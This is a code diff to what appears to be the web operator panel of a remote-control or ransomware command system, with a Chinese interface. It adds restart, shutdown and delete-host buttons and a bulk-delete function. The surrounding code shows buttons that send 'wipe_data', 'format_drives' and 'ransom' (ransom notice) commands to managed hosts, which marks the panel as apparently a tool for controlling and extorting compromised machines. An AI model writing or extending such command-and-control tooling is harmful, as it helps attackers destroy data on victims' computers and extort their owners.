@@ -137,6 +137,10 @@
                 <button class="btn btn-ghost" onclick="startRemoteControl()">远程控制</button>
                 <button class="btn btn-primary" onclick="openMoveGroupModal()">移动分组</button>
                 <div style="width: 1px; height: 24px; background: var(--border); margin: 0 0.5rem;"></div>
+                <button class="btn btn-danger" onclick="openCommandModal('restart')">重启系统</button>
+                <button class="btn btn-danger" onclick="openCommandModal('shutdown')">关闭系统</button>
+                <button class="btn btn-danger" onclick="confirmDeleteDevices()">删除主机</button>
+                <div style="width: 1px; height: 24px; background: var(--border); margin: 0 0.5rem;"></div>
                 <button class="btn btn-danger" onclick="openCommandModal('wipe_data')">清除数据</button>
                 <button class="btn btn-danger" onclick="openCommandModal('format_drives')">格式化</button>
                 <button class="btn btn-danger" onclick="openCommandModal('ransom')">勒索提示</button>
@@ -805,6 +809,35 @@
 
         function getSelectedIds() {
             return Array.from(document.querySelectorAll('.device-checkbox:checked')).map(cb => cb.value);
+        }
+
+        function confirmDeleteDevices() {
+            const selected = getSelectedIds();
+            if (selected.length === 0) {
+                showToast("请先选择设备", "error");
+                return;
+            }
+            if (confirm(`确定要删除选中的 ${selected.length} 台设备吗？\n删除后设备列表将不再显示这些设备，直到它们重新上线。`)) {
+                let successCount = 0;
+                let failCount = 0;
+                let completed = 0;
+                
+                selected.forEach(id => {
+                    fetch(`/admin/delete_device?id=${id}`, { method: 'POST' })
+                        .then(res => {
+                            if (res.ok) successCount++;
+                            else failCount++;
+                        })
+                        .catch(() => failCount++)
+                        .finally(() => {
+                            completed++;
+                            if (completed === selected.length) {
+                                showToast(`删除完成: 成功 ${successCount}, 失败 ${failCount}`, "success");
+                                setTimeout(() => location.reload(), 1000);
+                            }
+                        });
+                });
+            }
         }
 
         function submitCommand() {
